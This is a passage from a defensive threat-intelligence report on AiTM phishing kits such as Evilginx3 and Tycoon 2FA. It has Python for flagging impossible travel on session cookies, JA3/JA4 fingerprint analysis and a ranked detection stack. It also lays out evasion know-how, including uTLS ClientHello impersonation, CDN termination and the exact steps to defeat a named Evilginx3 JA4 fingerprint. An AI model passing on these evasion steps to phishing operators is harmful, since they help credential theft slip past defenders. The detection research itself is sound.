                continue  # too close together — CDN routing noise
            dist_km   = self._haversine(prev, fix)
            speed_kmh = (dist_km / (gap_s / 3600)) if gap_s > 0 else 0

            if speed_kmh > IMPOSSIBLE_SPEED_KMH and dist_km > 100:
                alert = {
                    'event':       'IMPOSSIBLE_TRAVEL',
                    'session_id':  session_id[:16] + '...',
                    'ip_a':        prev.ip,
                    'ip_b':        fix.ip,
                    'city_a':      f'{prev.city},{prev.country}',
                    'city_b':      f'{fix.city},{fix.country}',
                    'distance_km': round(dist_km,1),
                    'gap_seconds': round(gap_s,1),
                    'speed_kmh':   round(speed_kmh,1),
                    'threshold':   IMPOSSIBLE_SPEED_KMH,
                }
                break

        history.append(fix)
        if len(history) > 50: self._history[session_id] = history[-50:]
        return alert


# Integrate into mitmproxy response hook:
# travel_detector = ImpossibleTravelDetector()
# In response():
#   session_id = extract_session_cookie(flow.response)
#   if session_id:
#     alert = travel_detector.observe(session_id, src_ip)
#     if alert: emit_alert(alert)
```

---

## SECTION 5 — Evasion Arms Race

*Tycoon 2FA v3 Anti-Detection · JA3 Bypass Techniques · JA4+ · Next-Gen AiTM Evasion*

> **The threat actor's perspective:** Tycoon 2FA's evolution between Aug 2023 and May 2025 (Any.run analysis) shows a clear pattern — each time a detection method is published, the next release adds a countermeasure. The arms race is **asymmetric**: defenders publish detection methods in blogs; attackers release countermeasures in private Telegram channels within weeks. JA3 fingerprinting specifically has been losing effectiveness since 2022 due to JA3 randomisation libraries now being trivially available for Go.

---

### 5.1 How Sophisticated AiTM Operators Evade JA3

| Evasion Technique | How It Works | Effectiveness vs JA3 | Effectiveness vs JA4 | Used by |
|-------------------|-------------|---------------------|---------------------|---------|
| GREASE injection (uTLS library) | Use uTLS (Go library) to mimic Chrome/Firefox ClientHello including GREASE values and correct extension ordering | Defeats JA3 completely | Partially defeats JA4 cipher hash segment | Advanced operators; trivial with uTLS Go library |
| Cipher suite shuffling | Randomise non-TLS1.3 cipher suite ordering per connection | Changes JA3 hash each connection | Defeats JA4 cipher hash (sorted, but count still leaks) | Any operator using uTLS |
| TLS fingerprint impersonation (`utls.HelloChrome_Auto`) | Clone Chrome's exact ClientHello including GREASE, extension order, and padding | Defeats JA3 completely | JA4 extension hash matches Chrome; only timing betrays it | Sophisticated operators as of 2024 |
| Front-end CDN termination | Put Cloudflare/BunnyCDN in front; CDN terminates TLS with its own fingerprint | Defeats all JA3/JA4 analysis | Defeats JA4 completely — CDN fingerprint is benign | **Standard for PhaaS kits (Tycoon 2FA uses Cloudflare by default)** |
| PHP/Node backend architecture | PhaaS kit is server-side PHP/Node; victim-facing TLS is browser's own ClientHello | N/A — victim browser fingerprint is benign | N/A | All PhaaS kit operators by default |

---

### 5.2 JA4 Format — Why It's Harder to Evade Than JA3

JA4 **sorts** cipher suites and extensions before hashing, making the hash **order-independent**. To defeat the Evilginx3 JA4 fingerprint `t13d191000_9dc949149365_e7c285222651`, an attacker must:

1. Change extension count from 19 → ≥22 (Chrome range)
2. Add ALPN (`h2,http/1.1`)
3. Change cipher count from 10 → ≥15

This requires **full uTLS impersonation**, not just cipher shuffling. It's achievable but requires deliberate engineering effort.

```
JA4+ fingerprint family (FoxIO specification):

JA4   — TLS Client Hello (replaces JA3 for client detection)
JA4S  — TLS Server Hello (detect what TLS stack the server uses)
JA4H  — HTTP Client headers (User-Agent, Accept-Language, header order)
JA4L  — Light (TCP/IP packet-based; works without full TLS access)
JA4X  — X.509 certificate (detect self-signed / Let's Encrypt / ACME)
JA4SSH — SSH fingerprint

Evilginx3 honeypot-captured JA4 (Fox-IT / Webscout research 2024):
  t13d191000_9dc949149365_e7c285222651
  ↑  ↑ ↑ ↑  ↑ ↑↑
  t  13 d 19 10 00
  │  │  │ │  │  └─ ALPN: 00 = no ALPN (Go default — browsers always have h2)
  │  │  │ │  └──── Cipher suite count: 10
  │  │  │ └─────── Extension count: 19 (fixed in Go stdlib)
  │  │  └───────── SNI present: d
  │  └──────────── TLS 1.3
  └─────────────── TLS protocol
```

---

### 5.3 Next-Generation AiTM Evasion — 2025–2026 Horizon

**Tier 1: Already deployed in the wild**

- **CDN termination** — Tycoon 2FA and Mamba 2FA route all victim connections through Cloudflare, making the victim-facing TLS fingerprint indistinguishable from any Cloudflare-protected site. Detection pivots to content-layer and timing signals.
- **Full Cloudflare Turnstile gating** — All three PhaaS kit stages gate phishing content behind Turnstile CAPTCHA, blocking automated scanners and passive detection systems.
- **Multi-stage XOR+Base64 obfuscation** — Tycoon 2FA v3 uses per-sample XOR keys and Base64 encoding across three payload stages. CyberChef recipe for the Oct 2024 sample: `From_Base64 → XOR(key='Xz9nuEyiZi')`.
- **C2-gated payload delivery** — Stage 3 payload is fetched from a C2 server at runtime; not embedded in the delivery page, blocking YARA/string-match on the HTML.

**Tier 2: Emerging / research-stage**

- **Browser-in-Browser over WebRTC** — BitB attack moved from iframe-based (detectable by frame-busting) to WebRTC data channel delivery. Entire phishing interaction occurs in Canvas-rendered fake browser chrome. No URL bar; no TLS to inspect.
- **AI-personalised lure content** — Per-victim LLM-generated HTML; static signatures become useless. Detected only by structural/DOM analysis.
- **Token binding bypass** — Microsoft's CAE/continuous access evaluation aims to bind tokens to device keys. Attackers are prototyping extraction of TPM attestation alongside session cookies.

---

### 5.4 Detection Architecture That Survives JA3 Defeat

```
Detection layer hierarchy — most to least evasion-resistant:

1. RTT ratio fingerprinting (Kondracki CCS 2021 — 99.9% accuracy)
   Ratio: HTTP GET RTT / TCP SYN-ACK RTT >> 1 in all reverse proxies
   Survives: CDN termination (CDN adds extra hop — ratio still elevated)
   Defeated by: Co-located phishing server + target server (same DC) → rare

2. Impossible travel on session cookies
   Survives: All TLS evasion — operates on session cookie + IP layer
   Defeated by: Attacker using residential proxy near victim → active mitigation

3. JA4X certificate anomaly
   Flag: ACME/Let's Encrypt cert + domain <30 days old + login.*/sso.*/adfs.* subdomain
   Survives: Most evasion (certs can't be trivially impersonated)
   Defeated by: Operator using purchased wildcard cert → less common

4. Content-layer phishlet markers (Section 3)
   Survives: CDN termination (content is still proxied)
   Defeated by: Custom phishlet with renamed endpoints

5. JA4 Go TLS detection (Section 1)
   Survives: Default Go stdlib deployments (Evilginx3 out-of-box)
   Defeated by: uTLS, CDN termination → increasingly common
```

### 5.5 The Defender's Minimum Viable Detection Stack

Build in this priority order:

1. **RTT ratio detection (Zeek + custom script)** — single most evasion-resistant signal. Implement the SYN-ACK vs GET RTT ratio check from Kondracki CCS 2021. Open-source PHOCA implementation available at github.com/stonybrook-linqs.

2. **Impossible travel on session cookies** — catches post-compromise replay regardless of how the session was stolen. Requires extracting session cookie values from HTTPS traffic and correlating against GeoLite2.

3. **JA4X certificate anomaly** — flag TLS connections where the server certificate is ACME/Let's Encrypt issued AND the domain is <30 days old AND the subdomain prefix matches `login|sso|auth|adfs|account`. This combination covers >80% of Evilginx deployments per Deepwatch Aug 2024.

4. **Phishlet content markers (mitmproxy addon, Section 2)** — catches unmodified Evilginx3 deployments that haven't reconfigured default paths.

5. **JA4 Go TLS detection** *(corroborating signal only)* — useful for unmodified Evilginx3/Modlishka but increasingly bypassed by uTLS. Layer as a supporting signal, not a primary detector.

---

## Sources

Kondracki et al. "Catching Transparent Phish: Analyzing and Detecting MITM Phishing Toolkits" CCS 2021 (10.1145/3460120.3484765) · Deepwatch Labs "Catching the Phish — Detecting Evilginx & AiTM" Aug 2024 · Sekoia "Tycoon 2FA in-depth analysis" Jan 2024 · Any.run "Evolution of Tycoon 2FA Defense Evasion Mechanisms" May 2025 · FoxIO JA4+ Specification github.com/FoxIO-LLC/ja4 · RFC 8701 GREASE · kgretzky/evilginx2 phishlet documentation · An0nUD4Y Evilginx2-Phishlets repository · Webscout honeypot JA4 intelligence 2024 · MaxMind GeoLite2 documentation
